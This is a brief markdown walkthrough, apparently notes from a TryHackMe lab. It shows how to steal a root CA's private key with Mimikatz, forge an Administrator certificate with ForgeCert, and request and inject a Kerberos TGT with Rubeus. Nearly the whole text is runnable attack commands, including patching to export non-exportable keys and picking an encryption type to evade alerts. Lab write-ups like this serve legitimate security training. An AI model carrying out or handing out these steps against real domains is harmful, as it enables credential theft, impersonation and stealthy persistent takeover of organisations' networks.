## How to extract Privatekey from RootCA
1)Login into CA server
2)Run Mimikatz: 
```
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```
3)Check for CA cert: 
```
crypto::certificates /systemstore:local_machine
```
If private-key is marked as **not exportable**
```
crypto::capi
crypto::cng
```
6)Export Certificates from LocalMachine store: 
```
crypto::certificates /systemstore:local_machine /export
```
(Export password is: **mimikatz**)


## How to forge own certificates from RootCA
1)Download **Forgecert**
2)Forge a new cert: 
```
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```
3)Copy certificates to your machine
Parameters explained:
```
    CaCertPath - The path to our exported CA certificate.
    CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
    Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
    SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
    NewCertPath - The path to where ForgeCert will store the generated certificate.
    NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.
```


## How to register TGT from CAcert
1)Ask for new TGT: 
```
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:
```
Let's break down the parameters:
```

    /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
    /certificate - Path to the certificate we have generated
    /password - The password for our certificate file
    /outfile - The file where our TGT will be output to
    /domain - The FQDN of the domain we are currently attacking
    /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running
	
```
2)Launch Mimikatz: 
```
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```
3)Load TGT in memory:
```
kerberos::ptt **certicate.kirbi**
```